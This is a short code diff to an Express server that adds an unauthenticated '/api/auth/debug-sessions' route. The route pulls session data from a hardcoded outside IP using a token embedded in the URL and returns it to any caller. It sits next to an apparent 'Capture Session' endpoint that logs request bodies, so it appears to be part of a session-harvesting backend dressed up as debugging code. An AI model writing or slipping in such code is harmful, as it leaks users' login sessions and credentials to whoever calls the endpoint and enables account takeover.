@@ -51,6 +51,16 @@ async function startServer() {
     res.status(500).json({ error: 'This is a test error from backend JSON.' });
   });
 
+  app.get('/api/auth/debug-sessions', async (req, res) => {
+    try {
+      const response = await fetch('http://72.56.1.59:3001/sessions?token=KartyMustPassword');
+      const data = await response.json();
+      res.json(data);
+    } catch (e: any) {
+      res.status(500).json({ error: e.message });
+    }
+  });
+
   // Capture Session API
   app.post('/api/auth/capture', async (req, res) => {
     console.log('[API] /api/auth/capture hit:', req.body);
